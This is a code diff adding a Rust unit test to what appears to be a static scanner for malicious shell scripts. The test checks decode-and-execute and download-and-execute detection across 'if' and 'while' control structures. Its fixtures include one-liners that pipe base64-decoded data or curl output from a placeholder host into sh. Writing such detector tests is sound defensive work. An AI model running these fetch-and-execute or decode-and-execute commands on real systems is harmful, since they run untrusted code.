@@ -2408,6 +2408,44 @@ fn compound_decoder_producers_reach_pipeline_consumers() {
 }
 
 #[test]
+fn control_nodes_preserve_outer_consumers_and_output_redirects() {
+    let (artifacts, _) = one(
+        "control-pipeline.sh",
+        PayloadKind::Shell,
+        "#!/bin/sh\nif true; then base64 -d payload.b64; fi | sh\n",
+    );
+    assert_eq!(
+        findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
+        1,
+        "{:?}",
+        artifacts.rendered_findings()
+    );
+
+    let cases = [
+        (
+            "control-fetch-redirect.sh",
+            "sh -c 'if true; then curl https://example.test/live; fi >out' | sh",
+            false,
+        ),
+        (
+            "control-fetch-condition.sh",
+            "sh -c 'while curl https://example.test/live; false; do :; done' | sh",
+            true,
+        ),
+    ];
+    for (name, line, expected) in cases {
+        let source = format!("#!/bin/sh\n{line}\n");
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
+        assert_eq!(
+            findings.len(),
+            usize::from(expected),
+            "{name}: {findings:?}"
+        );
+    }
+}
+
+#[test]
 fn logical_units_join_multiline_pipelines() {
     // An escaped newline and a trailing pipe both continue the command;
     // the finding keeps the STARTING line.
